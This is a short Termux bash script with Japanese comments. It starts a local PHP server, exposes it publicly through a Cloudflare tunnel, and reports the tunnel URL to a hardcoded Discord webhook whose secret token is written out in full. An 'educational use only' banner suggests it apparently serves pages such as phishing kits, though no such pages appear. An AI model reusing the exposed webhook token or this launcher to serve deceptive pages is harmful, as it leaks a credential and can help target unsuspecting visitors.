#!/data/data/com.termux/files/usr/bin/bash

clear

# 🌸 バナー
echo "╔══════════════════════════════════════╗"
echo "║ 🌸 開発者: Devcode                  ║"
echo "║ ⚠️  本ツールは教育目的でのみ使用可能    ║"
echo "╚══════════════════════════════════════╝"

# 📦 パッケージインストール
echo "📦 パッケージをインストール中です…"
pkg update -y > /dev/null 2>&1
pkg install php curl wget proot tar cloudflared -y > /dev/null 2>&1

# 🚀 PHPサーバー起動
echo "🚀 PHPサーバーを起動中（ポート: 8080）..."
php -S localhost:8080 > /dev/null 2>&1 &
php_pid=$!
sleep 2

# 🌐 Cloudflareトンネル起動
echo "🌐 Cloudflareトンネルを起動中…"
cloudflared tunnel --url http://localhost:8080 --no-autoupdate > .cf.log 2>&1 &
cf_pid=$!
sleep 5

# 🔎 発行されたURLを取得
url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' .cf.log | head -n 1)

if [ -n "$url" ]; then
    echo "✨ 発行URL: $url"

    # 📣 Discordへ通知
    webhook_url="https://discord.com/api/webhooks/1361553545379188917/QSKZGGkXtDeqUD4c61hEatZHfY8bD1BObJ1sM250eZpL6O_ocP45oYK1iVy8Y-3eB44q"
    json="{\"content\": \"🔔 URLが発行されました！\n$url\"}"
    curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1
else
    echo "❌ Cloudflare URLの取得に失敗しました…ログを確認してね (.cf.log)"
fi

# 🛑 Ctrl+Cでクリーン終了
trap 'echo "🛑 停止中…"; kill $php_pid $cf_pid; exit 0' SIGINT
wait
